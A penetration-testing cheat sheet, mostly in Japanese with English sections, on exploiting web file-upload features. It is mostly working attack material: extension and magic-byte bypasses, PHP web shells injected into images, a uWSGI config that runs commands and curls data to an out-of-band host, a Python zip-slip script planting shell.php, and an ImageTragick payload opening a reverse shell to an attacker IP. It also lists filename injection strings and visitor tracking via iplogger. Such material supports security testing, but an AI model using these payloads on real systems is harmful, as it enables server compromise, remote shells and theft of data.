# ファイルアップロード

{{#include ../../banners/hacktricks-training.md}}

## File Upload General Methodology

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. 該当する場合、前述の拡張子をチェックする。大文字を使っても試す: _pHp, .pHP5, .PhAr ..._
2. _実行拡張子の前に有効な拡張子を追加してみる（前述の拡張子も利用）:_  
- _file.png.php_  
- _file.png.Php5_
3. ファイル名の末尾に特殊文字を追加してみる。Burp を使って全ての ascii と Unicode 文字をブルートフォースすることもできる。(_前述の拡張子も使えることに注意_)  
- _file.php%20_  
- _file.php%0a_  
- _file.php%00_  
- _file.php%0d%0a_  
- _file.php/_  
- _file.php.\\_  
- _file._  
- _file.php...._  
- _file.pHp5...._
4. サーバー側の拡張子パーサーを騙すことで保護を回避する。拡張子を二重にする、拡張子の間に junk データ（null バイト）を入れる等の手法が有効。_より良いペイロードを作るために前述の拡張子も併用できる。_  
- _file.png.php_  
- _file.png.pHp5_  
- _file.php#.png_  
- _file.php%00.png_  
- _file.php\x00.png_  
- _file.php%0a.png_  
- _file.php%0d%0a.png_  
- _file.phpJunk123png_
5. 前述のチェックにさらに別の拡張子レイヤーを追加する:  
- _file.png.jpg.php_  
- _file.php%00.png%00.jpg_
6. 実行拡張子を有効な拡張子の前に置いて、サーバーの誤設定に賭ける（Apache の誤設定で .php を含むものは必ずしも .php で終わっていなくても実行される場合がある）:  
- _ex: file.php.png_
7. **Windows** の **NTFS alternate data stream (ADS)** を使用する手法。禁止された拡張子の後にコロン ":" を挿入し、許可された拡張子の前に置く。結果として、サーバー上に**禁止拡張子だけの空ファイル**が作成される（例: "file.asax:.jpg"）。このファイルは後で short filename などを用いて編集される可能性がある。"**::$data**" パターンを使って非空のファイルを作成することもできるため、このパターンの後にドットを付けることでさらなる制限を回避できることがある（例: "file.asp::$data."）。
8. ファイル名の長さ制限を破ってみる。有効な拡張子が切り落とされ、悪意ある PHP が残る。AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Bypass Content-Type, Magic Number, Compression & Resizing

- Content-Type チェックは、リクエストヘッダの Content-Type を次のように設定して回避することができる: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type の wordlist: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- magic number チェックは、ファイルの先頭に実際の画像のバイトを追加して（file コマンドを混乱させる）、あるいはメタデータ内にシェルを埋め込むことで回避できる:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` または画像内に直接ペイロードを挿入することも可能:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- もし画像に対して圧縮が行われる場合（例えば PHP-GD のような標準的な PHP ライブラリを使っている場合）、前述の手法は有効でないことがある。しかし、**PLTE chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により圧縮後も残るテキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web ページが画像を **リサイズ**（例えば PHP-GD の `imagecopyresized` や `imagecopyresampled` を使用）している場合でも、**IDAT chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により圧縮後も残るデータを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- PHP-GD の `thumbnailImage` を使ったリサイズでも生き残るペイロードを作る別の手法がある。**tEXt chunk** を使う [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) により、圧縮後も残るテキストを挿入できる。
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- アップロード済みファイルを **rename** できる脆弱性を見つける（拡張子を変更するため）。
- Local File Inclusion 脆弱性を見つけてバックドアを実行する。
- **可能な情報漏洩**:  
1. 同じ名前のファイルを **複数回**（かつ同時に）アップロードする。  
2. 既に存在する **ファイル** または **フォルダ** と同名のファイルをアップロードする。  
3. 名前が ".”, "..”, または "…” のファイルをアップロードする。例えば Windows 上の Apache では、アプリケーションがアップロードファイルを "/www/uploads/" に保存すると、"." というファイル名は "/www/" に "uploads" というファイルを作成することがある。  
4. NTFS のように削除が難しいファイル名（例: "…:.jpg"）をアップロードする。（Windows）  
5. Windows で `|<>*?”` のような無効文字を名前に含むファイルをアップロードする。（Windows）  
6. CON, PRN, AUX, NUL, COM1 ... LPT9 のような予約済み（禁止）名を使って Windows にファイルをアップロードする。  
- 実行可能ファイル（.exe）や開かれたときにコードを実行する .html（あまり怪しまれない）をアップロードすることも試す。

### Special extension tricks

PHP サーバーにアップロードする場合は、[.htaccess を使ってコードを実行するトリック](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution) を参照すること。\
ASP サーバーにアップロードする場合は、[.config を使ってコードを実行するトリック](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files) を参照すること。

`.phar` ファイルは java の `.jar` に似ているが php 向けで、php で実行したりスクリプト内で include することで **php ファイルのように利用**できる。

`.inc` 拡張子はインポート用の php ファイルに使われることがあり、結果としてこの拡張子が実行可能になっている場合がある。

## **Jetty RCE**

Jetty サーバーに XML ファイルをアップロードできる場合、[新しい \*.xml と \*.war が自動的に処理されるため RCE を得られる](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**。** つまり、以下の画像に示されているように、XML ファイルを `$JETTY_BASE/webapps/` にアップロードすればシェルが得られる可能性がある。

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

この脆弱性の詳細な調査については、オリジナルの調査を参照すること: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)。

Remote Command Execution (RCE) 脆弱性は、`.ini` 設定ファイルを変更できる権限がある場合に uWSGI サーバーで悪用され得る。uWSGI の設定ファイルは特定の構文を用いて "magic" な変数、プレースホルダ、演算子を組み込める。特に `@(filename)` として使われる '@' 演算子はファイルの内容を include するためのものとして設計されている。uWSGI がサポートするスキームの中で、"exec" スキームは特に強力で、プロセスの標準出力からデータを読み取ることを可能にする。この機能は、`.ini` 設定ファイルが処理される際に Remote Command Execution や Arbitrary File Write/Read のような悪用につながる可能性がある。

以下は有害な `uwsgi.ini` ファイルの例で、様々なスキームを示している:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
ペイロードの実行は設定ファイルの解析時に発生します。設定が有効化され解析されるためには、uWSGIプロセスを再起動する必要があります（クラッシュ後やDenial of Service attackのために再起動される場合を含みます）、またはファイルをauto-reloadに設定しておく必要があります。auto-reload機能が有効になっている場合、変更を検出すると指定した間隔でファイルを再読み込みします。

uWSGIの設定ファイルの解析が緩い点を理解することが重要です。具体的には、ここで述べたペイロードはバイナリファイル（画像やPDFなど）に埋め込むことが可能であり、悪用の範囲がさらに広がります。

## **wget File Upload/SSRF Trick**

場合によっては、サーバが**`wget`**で**ファイルをダウンロード**しており、あなたが**URL**を**指定**できることがあります。その場合、コードがダウンロードしたファイルの拡張子がwhitelistに含まれているかを検査し、許可されたファイルのみがダウンロードされることを保証していることがあります。**ただし、このチェックはバイパス可能です。**

linuxにおけるファイル名の最大長は255ですが、**wget**はファイル名を236文字に切り詰めます。例えば、**"A"\*232+".php"+".gif"** というファイル名でダウンロードさせることができ、このファイル名は**チェックをバイパス**します（この例では **".gif"** が**有効な**拡張子です）が、`wget` はファイル名を **"A"\*232+".php"** に**rename**します。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Some legacy upload handlers that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces in CTFs and older codebases.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 異なるフォルダに解凍する

解凍時にディレクトリ内へ予期せぬファイルが作成される問題は重大です。一見、この構成は悪意あるファイルのアップロードを通じたOSレベルのコマンド実行を防げるように見えますが、ZIPアーカイブ形式が持つ階層的な圧縮サポートとdirectory traversalの能力は悪用可能です。これにより、攻撃者は制限を回避し、対象アプリケーションの解凍機能を操作してsecure upload directoriesから脱出できます。

このようなファイルを作成する自動エクスプロイトは[**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)で入手できます。ユーティリティの使い方は次の通りです:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
さらに、**symlink trick with evilarc** も選択肢です。ターゲットが `/flag.txt` のようなファイルである場合、そのファイルへの symlink をシステム上に作成してください。これにより evilarc が動作中にエラーを起こさないようにします。

以下は悪意のある zip ファイルを作成するために使用される Python コードの例です:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

詳細は**オリジナル投稿を確認してください**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHPコードは、`$_REQUEST`変数経由で渡されたコマンドを実行するように書かれています。

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 複数のファイルを作成し、これらのファイルを含むzipアーカイブを作成します。

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip内のファイル名をviやHex Editorで変更し、"xxA"を"../"に置換してディレクトリを横断します。

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

この内容を画像拡張子でアップロードすると、脆弱性 **(ImageMagick , 7.0.1-1)** を悪用できます（詳細は [exploit](https://www.exploit-db.com/exploits/39767) を参照）。
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNGにPHP Shellを埋め込む

PNGファイルのIDATチャンクにPHP Shellを埋め込むことで、特定の画像処理を効果的にバイパスできます。`imagecopyresized`や`imagecopyresampled`といったPHP-GDの関数は、それぞれ画像のリサイズやリサンプリングに一般的に使用されるため、この文脈で特に関連があります。埋め込まれたPHP Shellがこれらの処理の影響を受けずに残ることは、特定のユースケースで大きな利点です。

この技術の手法や応用可能性を含む詳細な解説は、次の記事で提供されています: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)。このリソースはプロセスとその影響を包括的に理解するのに役立ちます。

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot filesはサイバーセキュリティにおけるユニークなツールであり、複数のファイル形式として同時に有効に存在できるカメレオンのように振る舞います。興味深い例としては[GIFAR](https://en.wikipedia.org/wiki/Gifar)があり、これはGIFとRARアーカイブの両方として機能するハイブリッドです。このようなファイルはこの組み合わせに限らず、GIFとJSやPPTとJSのような組み合わせも可能です。

ポリグロットの主要な有用性は、ファイルの種類に基づいてファイルをスクリーニングするセキュリティ対策を回避できる点にあります。多くのアプリケーションでは、潜在的に危険な形式（例: JS、PHP、または Phar files）によるリスクを軽減するために、JPEG、GIF、またはDOCのような特定のファイルタイプのみをアップロード可とするのが一般的です。

適応性が高い一方で、polyglotsには制限もあります。例えば、あるpolyglotが同時にPHAR file (PHp ARchive)とJPEGを具備していても、アップロードの可否はプラットフォームのファイル拡張子ポリシーに依存する可能性があります。システムが許可される拡張子に厳格であれば、polyglotの構造上の二重性だけではアップロードを保証できないかもしれません。

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### JSONをPDFのふりをしてアップロードする方法

許可されていない場合でも有効なJSONファイルをPDFとして偽装してアップロードすることでファイルタイプ検出を回避する方法（**[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**からの技術）:

- **`mmmagic` library**: 最初の1024バイト以内に`%PDF`のマジックバイトがあれば有効です（例は記事参照）
- **`pdflib` library**: JSONのフィールド内に偽のPDFフォーマットを入れることでライブラリにPDFだと判断させる（例は記事参照）
- **`file` binary**: ファイルから最大1048576バイトを読み取れます。これより大きなJSONを作成して内容をjsonとして解析できなくさせ、JSONの中に実際のPDFの先頭部を入れれば、それをPDFだと判断します

## 参考

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
